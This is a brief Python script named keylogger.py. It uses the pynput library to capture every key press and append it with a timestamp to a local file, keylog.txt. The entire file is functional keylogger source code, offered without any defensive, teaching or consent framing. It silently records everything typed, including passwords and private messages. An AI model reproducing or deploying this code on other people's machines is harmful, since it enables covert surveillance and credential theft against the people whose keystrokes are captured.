# keylogger.py

from pynput import keyboard
import logging

# Configure logging to write keystrokes to a file
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the key press
        logging.info(str(key))
    except Exception as e:
        logging.error(f'Error: {e}')

# Set up listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
